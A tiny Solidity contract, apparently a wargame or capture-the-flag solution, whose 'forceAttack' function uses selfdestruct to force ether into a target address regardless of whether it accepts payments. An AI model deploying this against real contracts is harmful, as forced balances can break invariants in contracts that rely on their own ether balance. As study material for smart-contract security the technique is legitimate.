pragma solidity ^0.5.1;

contract ForceSol {
    constructor() public payable {}

    function forceAttack(address payable _forced) public {
        selfdestruct(_forced);
    }
}
